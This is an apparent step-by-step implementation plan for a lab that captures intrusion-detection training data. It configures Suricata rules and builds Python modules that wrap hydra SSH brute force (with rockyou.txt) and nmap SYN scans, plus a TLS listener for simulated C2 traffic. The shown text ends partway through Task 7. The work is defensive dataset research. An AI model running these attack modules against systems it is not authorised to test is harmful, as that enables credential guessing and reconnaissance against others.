# Self-Collected Dataset Capture Infrastructure Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the infrastructure to capture the self-collected dataset required by
`nidps_report` §5.2.2: bring Suricata into the repo in passive/IDS mode, script all 10 in-scope
attacks with consistent timestamped logging, and orchestrate benign/attack capture sessions.

**Architecture:** Three layers, each depending only on the one before it. A shared attack-runner
(`common/runner.py`) gives every attack identical timing, signal-safe teardown, and JSONL logging
regardless of which external tool or custom logic it wraps. Each attack module separates pure
command/data construction (unit-testable) from the actual subprocess/socket execution (manually
verified against the live lab). A capture pipeline wraps `tcpdump` + Suricata around either a
benign window or one attack invocation.

**Tech Stack:** Python 3.11+, pytest, hydra, nmap, arpspoof/dnsspoof (dsniff), hping3, tcpdump,
Suricata 7+.

**Spec:** `docs/superpowers/specs/2026-10-22-self-collected-dataset-capture-design.md`

## Global Constraints

- Python 3.11+ for all new code (Table 4.16).
- External tools (hydra, nmap, arpspoof, dnsspoof, hping3, tcpdump, suricata) are assumed
  installed on PATH; every attack module checks for its own tools before running and fails fast
  with a named error if missing, rather than a buried subprocess error.
- Every attack invocation (dry-run included — Task 3's `run_attack` prints it before branching
  on `dry_run`) prints a one-line safety banner naming the isolated lab network requirement
  (risk R10).
- `attacks.jsonl` record schema is fixed: `attack`, `tool`, `attacker_ip`, `victim_ip`,
  `start_time`, `end_time` (UTC ISO 8601, trailing `Z`), `status`
  (`completed`|`failed`|`interrupted`|`dry_run`), `params` (dict), `notes`, `stderr_tail`. No
  task may deviate from this schema.
- Suricata runs passive/IDS (alert-only) mode only — no NFQUEUE/IPS wiring in this plan.
- No flow extraction or ML-ready labelling in this plan — output stops at raw pcap + `eve.json`
  + `attacks.jsonl`.

---

### Task 1: Suricata configuration bring-up

**Files:**
- Create: `nidps/suricata/suricata.yaml`
- Create: `nidps/suricata/custom.rules`
- Create: `nidps/suricata/rule-update.sh`
- Create: `nidps/suricata/README.md`

**Interfaces:**
- Consumes: nothing (first task).
- Produces: a Suricata config any later component can point `suricata -c nidps/suricata/suricata.yaml`
  at; `eve.json` output path is `/var/log/suricata/eve.json` by default, overridable per capture
  session (Task 18 passes `-l <session_dir>` to redirect it).

- [ ] **Step 1: Locate and copy the global Suricata config**

Run:
```bash
sudo find /etc/suricata -maxdepth 1 -name "suricata.yaml"
```
Copy the found file into the repo:
```bash
sudo cp /etc/suricata/suricata.yaml /home/raza/Desktop/nidps/nidps_report_copy_tmp.yaml
sudo chown "$USER" /home/raza/Desktop/nidps/nidps_report_copy_tmp.yaml
mkdir -p /home/raza/Desktop/nidps/nidps/suricata
mv /home/raza/Desktop/nidps/nidps_report_copy_tmp.yaml /home/raza/Desktop/nidps/nidps/suricata/suricata.yaml
```

- [ ] **Step 2: Adapt the copied `suricata.yaml` for passive lab capture**

Edit `nidps/suricata/suricata.yaml`:
- Under `af-packet:`, set the `interface:` to the VirtualBox host-only adapter name (find it with
  `ip link show` on the host — typically `vboxnet0`).
- Confirm (or add) a rule-files entry pointing at the custom rules file:
  ```yaml
  rule-files:
    - custom.rules
  ```
  alongside whatever Emerging Threats Open rule files the global config already references.
- Leave `nfqueue:` settings untouched/unused — this plan never invokes Suricata in `-q` (NFQUEUE)
  mode, only `-i <interface>` (passive af-packet capture).

- [ ] **Step 3: Write the custom rules file**

Create `nidps/suricata/custom.rules`:
```
# SSH brute force: >=5 new connections to tcp/22 from one source in 60s
alert tcp any any -> any 22 (msg:"NIDPS-CUSTOM SSH brute force attempt"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:9000001; rev:1;)

# Port scan: >=20 distinct destination ports from one source in 10s
alert tcp any any -> any any (msg:"NIDPS-CUSTOM Port scan detected"; flags:S; threshold:type threshold, track by_src, count 20, seconds 10; sid:9000002; rev:1;)

# DNS spoofing: a DNS response arriving from any source other than the AP's own resolver
# NOTE: replace 192.168.56.1 with this host's actual IP on the lab network before use.
alert udp !192.168.56.1 53 -> any any (msg:"NIDPS-CUSTOM Unexpected DNS response source"; sid:9000003; rev:1;)

# SYN flood: SYNs to one destination well above a calibrated baseline rate
alert tcp any any -> any any (msg:"NIDPS-CUSTOM Possible SYN flood"; flags:S; threshold:type threshold, track by_dst, count 100, seconds 10; sid:9000004; rev:1;)

# Known-bad JA3: placeholder entry, filled in once Task 11's one-time
# capture step records this lab's actual "known-bad" JA3 hash.
# alert tls any any -> any any (msg:"NIDPS-CUSTOM Known-bad JA3 client"; ja3_hash; content:"<FILL_IN_AFTER_TASK_11>"; sid:9000005; rev:1;)
```
(The JA3 rule stays commented out until Task 11 produces a real hash — see that task's manual
calibration step. This is not a placeholder left incomplete by omission: it is an explicit,
documented dependency on empirical data that does not exist until Task 11 runs once against the
live lab.)

- [ ] **Step 4: Write the rule-update placeholder and README**

Create `nidps/suricata/rule-update.sh`:
```bash
#!/usr/bin/env bash
# Placeholder for the daily ET Open ruleset update job (report §6.6.1).
# NOT wired to a scheduler in this plan — run manually if/when needed:
#   suricata-update --suricata-conf nidps/suricata/suricata.yaml
set -euo pipefail
echo "rule-update.sh is a placeholder; not scheduled. Run suricata-update manually." >&2
exit 1
```
```bash
chmod +x nidps/suricata/rule-update.sh
```

Create `nidps/suricata/README.md`:
```markdown
# Suricata (lab capture config)

Passive/IDS mode only — no NFQUEUE/IPS wiring here (that's separate Phase-0 dataplane work).

Start manually for a capture session:

    sudo suricata -c nidps/suricata/suricata.yaml -i <host-only-interface> -l <session_dir>

Test the config without running it:

    suricata -T -c nidps/suricata/suricata.yaml -i <host-only-interface>
```

- [ ] **Step 5: Validate the config**

Run (replace `vboxnet0` with your actual host-only interface name):
```bash
suricata -T -c nidps/suricata/suricata.yaml -i vboxnet0
```
Expected: output ends with a line containing `Configuration provided was successfully loaded`.
If it fails on the interface name, fix Step 2's `interface:` value and re-run.

- [ ] **Step 6: Commit**

```bash
git add nidps/suricata/
git commit -m "feat: bring Suricata config into repo for lab capture (passive IDS mode)"
```

---

### Task 2: Attack-runner core — records, tool checks, one-shot subprocess execution

**Files:**
- Create: `training/__init__.py`
- Create: `training/selfcollected/__init__.py`
- Create: `training/selfcollected/attacks/__init__.py`
- Create: `training/selfcollected/attacks/common/__init__.py`
- Create: `training/selfcollected/attacks/common/runner.py`
- Test: `tests/training/selfcollected/attacks/test_runner.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `AttackRecord` dataclass, `check_tools(tool_names: list[str]) -> None`,
  `append_record(out_dir: Path, record: AttackRecord) -> None`,
  `run_subprocess(cmd: list[str], timeout: float | None = None) -> None` — all imported by every
  later attack module and by Task 3's `run_attack`.

- [ ] **Step 1: Create package `__init__.py` files**

```bash
mkdir -p training/selfcollected/attacks/common
touch training/__init__.py training/selfcollected/__init__.py \
      training/selfcollected/attacks/__init__.py \
      training/selfcollected/attacks/common/__init__.py
mkdir -p tests/training/selfcollected/attacks
touch tests/training/__init__.py tests/training/selfcollected/__init__.py \
      tests/training/selfcollected/attacks/__init__.py
```

- [ ] **Step 2: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_runner.py`:
```python
import json
import subprocess
import pytest

from training.selfcollected.attacks.common.runner import (
    AttackRecord,
    check_tools,
    append_record,
    run_subprocess,
)


def test_attack_record_to_json_line_round_trips():
    record = AttackRecord(
        attack="ssh_bruteforce", tool="hydra", attacker_ip="10.0.0.2",
        victim_ip="10.0.0.3", start_time="2026-10-22T10:00:00Z",
        end_time="2026-10-22T10:01:00Z", status="completed",
        params={"port": 22},
    )
    line = record.to_json_line()
    parsed = json.loads(line)
    assert parsed["attack"] == "ssh_bruteforce"
    assert parsed["params"] == {"port": 22}
    assert parsed["notes"] == ""
    assert parsed["stderr_tail"] == ""


def test_check_tools_passes_when_all_present(monkeypatch):
    monkeypatch.setattr("shutil.which", lambda name: f"/usr/bin/{name}")
    check_tools(["hydra", "nmap"])  # should not raise


def test_check_tools_raises_with_missing_tool_name(monkeypatch):
    def fake_which(name):
        return None if name == "hydra" else f"/usr/bin/{name}"
    monkeypatch.setattr("shutil.which", fake_which)
    with pytest.raises(FileNotFoundError, match="hydra"):
        check_tools(["hydra", "nmap"])


def test_append_record_writes_one_jsonl_line_per_call(tmp_path):
    record1 = AttackRecord(
        attack="port_scan", tool="nmap", attacker_ip="10.0.0.2",
        victim_ip="10.0.0.3", start_time="t1", end_time="t2",
        status="completed", params={},
    )
    record2 = AttackRecord(
        attack="syn_flood", tool="hping3", attacker_ip="10.0.0.2",
        victim_ip="10.0.0.3", start_time="t3", end_time="t4",
        status="failed", params={}, stderr_tail="boom",
    )
    append_record(tmp_path, record1)
    append_record(tmp_path, record2)
    lines = (tmp_path / "attacks.jsonl").read_text().splitlines()
    assert len(lines) == 2
    assert json.loads(lines[0])["attack"] == "port_scan"
    assert json.loads(lines[1])["status"] == "failed"


def test_run_subprocess_succeeds_quietly_on_zero_exit():
    run_subprocess(["true"])  # should not raise


def test_run_subprocess_raises_called_process_error_with_stderr_on_failure():
    with pytest.raises(subprocess.CalledProcessError) as exc_info:
        run_subprocess(["python3", "-c", "import sys; sys.stderr.write('bad'); sys.exit(1)"])
    assert "bad" in exc_info.value.stderr
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_runner.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'training.selfcollected.attacks.common.runner'`

- [ ] **Step 4: Implement `runner.py` (part 1 — records, tool checks, one-shot execution)**

Create `training/selfcollected/attacks/common/runner.py`:
```python
from __future__ import annotations

import dataclasses
import json
import shutil
import subprocess
from pathlib import Path


@dataclasses.dataclass
class AttackRecord:
    attack: str
    tool: str
    attacker_ip: str
    victim_ip: str
    start_time: str
    end_time: str
    status: str  # "completed" | "failed" | "interrupted" | "dry_run"
    params: dict
    notes: str = ""
    stderr_tail: str = ""

    def to_json_line(self) -> str:
        return json.dumps(dataclasses.asdict(self))


def check_tools(tool_names: list[str]) -> None:
    missing = [t for t in tool_names if shutil.which(t) is None]
    if missing:
        raise FileNotFoundError(
            f"Required tool(s) not found on PATH: {', '.join(missing)}. "
            f"Install them before running this attack."
        )


def append_record(out_dir: Path, record: AttackRecord) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    path = out_dir / "attacks.jsonl"
    with path.open("a") as f:
        f.write(record.to_json_line() + "\n")


def run_subprocess(cmd: list[str], timeout: float | None = None) -> None:
    """Runs cmd to completion; raises CalledProcessError (with .stderr set) on nonzero exit."""
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise subprocess.CalledProcessError(
            result.returncode, cmd, output=result.stdout, stderr=result.stderr
        )
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_runner.py -v`
Expected: 6 passed

- [ ] **Step 6: Commit**

```bash
git add training/ tests/training/
git commit -m "feat: attack-runner core (AttackRecord, tool checks, subprocess execution)"
```

---

### Task 3: Attack-runner — timed execution, signal-safe teardown, dry-run

**Files:**
- Modify: `training/selfcollected/attacks/common/runner.py`
- Test: `tests/training/selfcollected/attacks/test_runner.py`

**Interfaces:**
- Consumes: `AttackRecord`, `append_record` from Task 2.
- Produces: `run_attack(attack_name, tool, attacker_ip, victim_ip, out_dir, params, body, dry_run=False) -> AttackRecord`
  and `run_timed_subprocess(cmd: list[str], duration: float) -> None` — both used by every
  per-attack module (Tasks 6-15).

- [ ] **Step 1: Write the failing tests**

Append to `tests/training/selfcollected/attacks/test_runner.py`:
```python
import os
import signal
import time

from training.selfcollected.attacks.common.runner import (
    run_attack,
    run_timed_subprocess,
)


def test_run_attack_completed_path_writes_record(tmp_path):
    record = run_attack(
        "port_scan", "nmap", "10.0.0.2", "10.0.0.3", tmp_path,
        params={"ports": "1-100"}, body=lambda: None,
    )
    assert record.status == "completed"
    assert record.start_time and record.end_time
    lines = (tmp_path / "attacks.jsonl").read_text().splitlines()
    assert len(lines) == 1


def test_run_attack_failed_path_captures_stderr_tail(tmp_path):
    def failing_body():
        raise subprocess.CalledProcessError(1, ["x"], stderr="oh no")
    record = run_attack(
        "syn_flood", "hping3", "10.0.0.2", "10.0.0.3", tmp_path,
        params={}, body=failing_body,
    )
    assert record.status == "failed"
    assert "oh no" in record.stderr_tail


def test_run_attack_dry_run_never_calls_body(tmp_path):
    calls = []
    record = run_attack(
        "ssh_bruteforce", "hydra", "10.0.0.2", "10.0.0.3", tmp_path,
        params={}, body=lambda: calls.append(1), dry_run=True,
    )
    assert calls == []
    assert record.status == "dry_run"


def test_run_attack_interrupted_by_sigint_still_writes_record(tmp_path):
    def slow_body():
        os.kill(os.getpid(), signal.SIGINT)
        time.sleep(10)  # should never reach here

    start = time.monotonic()
    record = run_attack(
        "arp_spoof", "arpspoof", "10.0.0.2", "10.0.0.3", tmp_path,
        params={}, body=slow_body,
    )
    elapsed = time.monotonic() - start
    assert record.status == "interrupted"
    assert elapsed < 5  # proves it didn't sleep the full 10s


def test_run_timed_subprocess_terminates_long_running_process_after_duration():
    start = time.monotonic()
    run_timed_subprocess(["sleep", "10"], duration=0.3)
    elapsed = time.monotonic() - start
    assert elapsed < 2  # terminated well before sleep would finish on its own


def test_run_timed_subprocess_raises_if_process_exits_nonzero_before_duration():
    with pytest.raises(subprocess.CalledProcessError):
        run_timed_subprocess(["python3", "-c", "import sys; sys.exit(1)"], duration=5)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_runner.py -v`
Expected: FAIL — `ImportError: cannot import name 'run_attack'`

- [ ] **Step 3: Implement `run_attack` and `run_timed_subprocess`**

Append to `training/selfcollected/attacks/common/runner.py`:
```python
import signal
import sys
import time
from datetime import datetime, timezone
from typing import Callable


class AttackInterrupted(Exception):
    """Raised internally when SIGINT/SIGTERM is received during an attack body."""


def _utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def run_attack(
    attack_name: str,
    tool: str,
    attacker_ip: str,
    victim_ip: str,
    out_dir: Path,
    params: dict,
    body: Callable[[], None],
    dry_run: bool = False,
) -> AttackRecord:
    print(
        f"[SAFETY] Running '{attack_name}' against {victim_ip} from {attacker_ip}. "
        f"This must only run on an isolated lab network you own.",
        file=sys.stderr,
    )

    if dry_run:
        print(f"[DRY RUN] Would run '{attack_name}' (tool={tool}) "
              f"attacker={attacker_ip} victim={victim_ip} params={params}")
        record = AttackRecord(
            attack=attack_name, tool=tool, attacker_ip=attacker_ip,
            victim_ip=victim_ip, start_time="", end_time="",
            status="dry_run", params=params,
        )
        append_record(out_dir, record)
        return record

    def _handler(signum, frame):
        raise AttackInterrupted()

    old_int = signal.signal(signal.SIGINT, _handler)
    old_term = signal.signal(signal.SIGTERM, _handler)

    start = _utc_now_iso()
    status = "completed"
    stderr_tail = ""
    try:
        body()
    except AttackInterrupted:
        status = "interrupted"
    except subprocess.CalledProcessError as exc:
        status = "failed"
        stderr_tail = (exc.stderr or "")[-2000:]
    except Exception as exc:  # must always record, even on an unexpected error
        status = "failed"
        stderr_tail = str(exc)[-2000:]
    finally:
        signal.signal(signal.SIGINT, old_int)
        signal.signal(signal.SIGTERM, old_term)

    end = _utc_now_iso()
    record = AttackRecord(
        attack=attack_name, tool=tool, attacker_ip=attacker_ip,
        victim_ip=victim_ip, start_time=start, end_time=end,
        status=status, params=params, stderr_tail=stderr_tail,
    )
    append_record(out_dir, record)
    return record


def run_timed_subprocess(cmd: list[str], duration: float) -> None:
    """Runs cmd in the background for `duration` seconds, then terminates it cleanly.

    Raises CalledProcessError if cmd exits on its own with a nonzero code before
    `duration` elapses.
    """
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        return
    if proc.returncode != 0:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise subprocess.CalledProcessError(proc.returncode, cmd, stderr=stderr)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_runner.py -v`
Expected: 12 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/common/runner.py tests/training/selfcollected/attacks/test_runner.py
git commit -m "feat: timed/signal-safe attack execution in the runner"
```

---

### Task 4: JA3 fingerprint computation

**Files:**
- Create: `training/selfcollected/attacks/common/ja3.py`
- Test: `tests/training/selfcollected/attacks/test_ja3.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `compute_ja3(version: int, ciphers: list[int], extensions: list[int], groups: list[int], point_formats: list[int]) -> str` —
  used by Task 11 (`ja3_c2.py`) and by Component 1's custom-rule calibration step.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_ja3.py`:
```python
import hashlib

from training.selfcollected.attacks.common.ja3 import compute_ja3


def test_compute_ja3_matches_manually_built_string_per_algorithm_5_1():
    # Algorithm 5.1 (ch5.tex §5.3.3): version,ciphers,extensions,groups,point_formats
    # joined with '-' within each field, fields joined with ',', then MD5 hex digest.
    version = 771
    ciphers = [4866, 4867, 4865]
    extensions = [0, 23, 65281, 10, 11, 35, 16]
    groups = [29, 23, 24]
    point_formats = [0]

    expected_string = "771,4866-4867-4865,0-23-65281-10-11-35-16,29-23-24,0"
    expected_hash = hashlib.md5(expected_string.encode("ascii")).hexdigest()

    assert compute_ja3(version, ciphers, extensions, groups, point_formats) == expected_hash


def test_compute_ja3_strips_grease_values_from_every_list():
    # 0x0a0a (2570) and 0x1a1a (6682) are GREASE values and must not appear in the string.
    version = 771
    ciphers = [2570, 4866, 4867]
    extensions = [6682, 0, 23]
    groups = [2570, 29]
    point_formats = [0]

    expected_string = "771,4866-4867,0-23,29,0"
    expected_hash = hashlib.md5(expected_string.encode("ascii")).hexdigest()

    assert compute_ja3(version, ciphers, extensions, groups, point_formats) == expected_hash


def test_compute_ja3_is_deterministic_for_same_input():
    args = (771, [4866, 4867], [0, 23], [29], [0])
    assert compute_ja3(*args) == compute_ja3(*args)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_ja3.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `ja3.py`**

Create `training/selfcollected/attacks/common/ja3.py`:
```python
"""JA3/JA3S TLS fingerprint computation, per Algorithm 5.1 (ch5.tex §5.3.3)."""

import hashlib

GREASE_VALUES = frozenset({
    0x0a0a, 0x1a1a, 0x2a2a, 0x3a3a, 0x4a4a, 0x5a5a, 0x6a6a, 0x7a7a,
    0x8a8a, 0x9a9a, 0xaaaa, 0xbaba, 0xcaca, 0xdada, 0xeaea, 0xfafa,
})


def _strip_grease(values: list[int]) -> list[int]:
    return [v for v in values if v not in GREASE_VALUES]


def compute_ja3(
    version: int,
    ciphers: list[int],
    extensions: list[int],
    groups: list[int],
    point_formats: list[int],
) -> str:
    """Computes the JA3 fingerprint of a TLS ClientHello.

    GREASE values are stripped from every list before joining, per Algorithm 5.1.
    Point formats are not GREASE-filtered (GREASE values never appear in that list
    in practice, but stripping is harmless if present).
    """
    fields = [
        str(version),
        "-".join(str(c) for c in _strip_grease(ciphers)),
        "-".join(str(e) for e in _strip_grease(extensions)),
        "-".join(str(g) for g in _strip_grease(groups)),
        "-".join(str(p) for p in _strip_grease(point_formats)),
    ]
    ja3_string = ",".join(fields)
    return hashlib.md5(ja3_string.encode("ascii")).hexdigest()
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_ja3.py -v`
Expected: 3 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/common/ja3.py tests/training/selfcollected/attacks/test_ja3.py
git commit -m "feat: JA3 fingerprint computation per Algorithm 5.1"
```

---

### Task 5: Minimal attacker-side TLS listener

**Files:**
- Create: `training/selfcollected/attacks/common/listener.py`
- Test: `tests/training/selfcollected/attacks/test_listener.py`

**Interfaces:**
- Consumes: nothing (uses Python stdlib `ssl`/`http.server` only).
- Produces: `generate_self_signed_cert(cert_path: Path, key_path: Path) -> None`,
  `start_listener(host: str, port: int, cert_path: Path, key_path: Path) -> threading.Thread` —
  used by Task 11 (`ja3_c2.py`) and Task 12 (`c2_beacon.py`) as the attacker-side endpoint they
  connect to.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_listener.py`:
```python
import socket
import ssl
import time

from training.selfcollected.attacks.common.listener import (
    generate_self_signed_cert,
    start_listener,
)


def test_generate_self_signed_cert_creates_both_files(tmp_path):
    cert_path = tmp_path / "cert.pem"
    key_path = tmp_path / "key.pem"
    generate_self_signed_cert(cert_path, key_path)
    assert cert_path.exists() and cert_path.stat().st_size > 0
    assert key_path.exists() and key_path.stat().st_size > 0


def test_start_listener_accepts_a_tls_connection(tmp_path):
    cert_path = tmp_path / "cert.pem"
    key_path = tmp_path / "key.pem"
    generate_self_signed_cert(cert_path, key_path)

    thread = start_listener("127.0.0.1", 8443, cert_path, key_path)
    time.sleep(0.2)  # let the listener bind

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection(("127.0.0.1", 8443), timeout=5) as sock:
        with ctx.wrap_socket(sock, server_hostname="127.0.0.1") as tls_sock:
            assert tls_sock.version() is not None

    assert thread.is_alive()  # daemon thread keeps serving further connections
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_listener.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `listener.py`**

Create `training/selfcollected/attacks/common/listener.py`:
```python
"""Minimal attacker-side TLS listener for ja3_c2.py and c2_beacon.py to connect to."""

import http.server
import ssl
import subprocess
import threading
from pathlib import Path


def generate_self_signed_cert(cert_path: Path, key_path: Path) -> None:
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", str(key_path), "-out", str(cert_path),
            "-days", "1", "-nodes",
            "-subj", "/CN=nidps-lab-c2-listener",
        ],
        check=True, capture_output=True,
    )


class _QuietHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002 - matches BaseHTTPRequestHandler signature
        pass  # keep test/attack output quiet; connections are logged by the caller if needed

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")


def start_listener(host: str, port: int, cert_path: Path, key_path: Path) -> threading.Thread:
    """Starts a minimal HTTPS listener on a daemon thread and returns it immediately."""
    server = http.server.HTTPServer((host, port), _QuietHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=str(cert_path), keyfile=str(key_path))
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return thread
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_listener.py -v`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/common/listener.py tests/training/selfcollected/attacks/test_listener.py
git commit -m "feat: minimal attacker-side TLS listener for C2 attack modules"
```

---

### Task 6: `ssh_bruteforce.py`

**Files:**
- Create: `training/selfcollected/attacks/ssh_bruteforce.py`
- Test: `tests/training/selfcollected/attacks/test_ssh_bruteforce.py`

**Interfaces:**
- Consumes: `check_tools`, `run_subprocess`, `run_attack`, `AttackRecord` from
  `training.selfcollected.attacks.common.runner`.
- Produces: `build_command(victim_ip, port, username, wordlist) -> list[str]`,
  `parse_extra_args(extra: list[str]) -> dict`, `run(victim_ip, attacker_ip, out_dir, port=22, username="admin", wordlist="/usr/share/wordlists/rockyou.txt", dry_run=False) -> AttackRecord` —
  `run` and `parse_extra_args` are consumed by Task 16's CLI dispatcher.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_ssh_bruteforce.py`:
```python
from training.selfcollected.attacks.ssh_bruteforce import build_command, parse_extra_args, run


def test_build_command_produces_expected_hydra_invocation():
    cmd = build_command("10.0.0.3", 22, "admin", "/tmp/wordlist.txt")
    assert cmd == ["hydra", "-l", "admin", "-P", "/tmp/wordlist.txt", "-s", "22", "10.0.0.3", "ssh"]


def test_parse_extra_args_defaults_when_nothing_passed():
    assert parse_extra_args([]) == {
        "port": 22, "username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt",
    }


def test_parse_extra_args_reads_overrides():
    parsed = parse_extra_args(["--port", "2222", "--username", "root", "--wordlist", "/tmp/w.txt"])
    assert parsed == {"port": 2222, "username": "root", "wordlist": "/tmp/w.txt"}


def test_run_dry_run_does_not_invoke_hydra(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.ssh_bruteforce.run_subprocess",
        lambda cmd: called.append(cmd),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_ssh_bruteforce.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `ssh_bruteforce.py`**

Create `training/selfcollected/attacks/ssh_bruteforce.py`:
```python
"""SSH brute force attack (FR-2.4, Table 5.4). Wraps hydra."""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_subprocess,
)

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"


def build_command(victim_ip: str, port: int, username: str, wordlist: str) -> list[str]:
    return ["hydra", "-l", username, "-P", wordlist, "-s", str(port), victim_ip, "ssh"]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"port": 22, "username": "admin", "wordlist": DEFAULT_WORDLIST}
    it = iter(extra)
    for arg in it:
        if arg == "--port":
            parsed["port"] = int(next(it))
        elif arg == "--username":
            parsed["username"] = next(it)
        elif arg == "--wordlist":
            parsed["wordlist"] = next(it)
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    port: int = 22,
    username: str = "admin",
    wordlist: str = DEFAULT_WORDLIST,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"port": port, "username": username, "wordlist": wordlist}

    def body():
        check_tools(["hydra"])
        run_subprocess(build_command(victim_ip, port, username, wordlist))

    return run_attack("ssh_bruteforce", "hydra", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_ssh_bruteforce.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/attacks/ssh_bruteforce.py tests/training/selfcollected/attacks/test_ssh_bruteforce.py
git commit -m "feat: ssh_bruteforce attack module"
```

---

### Task 7: `port_scan.py`

**Files:**
- Create: `training/selfcollected/attacks/port_scan.py`
- Test: `tests/training/selfcollected/attacks/test_port_scan.py`

**Interfaces:**
- Consumes: same runner primitives as Task 6.
- Produces: `build_command(victim_ip, ports, scan_type) -> list[str]`,
  `parse_extra_args(extra) -> dict`, `run(victim_ip, attacker_ip, out_dir, ports="1-1000", scan_type="-sS", dry_run=False) -> AttackRecord`.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/attacks/test_port_scan.py`:
```python
from training.selfcollected.attacks.port_scan import build_command, parse_extra_args, run


def test_build_command_produces_expected_nmap_invocation():
    cmd = build_command("10.0.0.3", "1-1000", "-sS")
    assert cmd == ["nmap", "-sS", "-p", "1-1000", "10.0.0.3"]


def test_parse_extra_args_defaults():
    assert parse_extra_args([]) == {"ports": "1-1000", "scan_type": "-sS"}


def test_parse_extra_args_overrides():
    assert parse_extra_args(["--ports", "1-65535", "--scan-type", "-sT"]) == {
        "ports": "1-65535", "scan_type": "-sT",
    }


def test_run_dry_run_does_not_invoke_nmap(tmp_path, monkeypatch):
    called = []
    monkeypatch.setattr(
        "training.selfcollected.attacks.port_scan.run_subprocess",
        lambda cmd: called.append(cmd),
    )
    record = run("10.0.0.3", "10.0.0.2", tmp_path, dry_run=True)
    assert called == []
    assert record.status == "dry_run"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/attacks/test_port_scan.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `port_scan.py`**

Create `training/selfcollected/attacks/port_scan.py`:
```python
"""Port scan attack (FR-2.4, Table 5.4). Wraps nmap."""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_subprocess,
)


def build_command(victim_ip: str, ports: str, scan_type: str) -> list[str]:
    return ["nmap", scan_type, "-p", ports, victim_ip]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"ports": "1-1000", "scan_type": "-sS"}
    it = iter(extra)
    for arg in it:
        if arg == "--ports":
            parsed["ports"] = next(it)
        elif arg == "--scan-type":
            parsed["scan_type"] = next(it)
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    ports: str = "1-1000",
    scan_type: str = "-sS",
    dry_run: bool = False,
) -> AttackRecord:
    params = {"ports": ports, "scan_type": scan_type}

    def body():
        check_tools(["nmap"])
        run_subprocess(build_command(victim_ip, ports, scan_type))

    return run_attack("port_scan", "nmap", attacker_ip, victim_ip, out_dir, params, body, dry_run)
```

- [ ] **Step 4: Run tests to verify they pass**

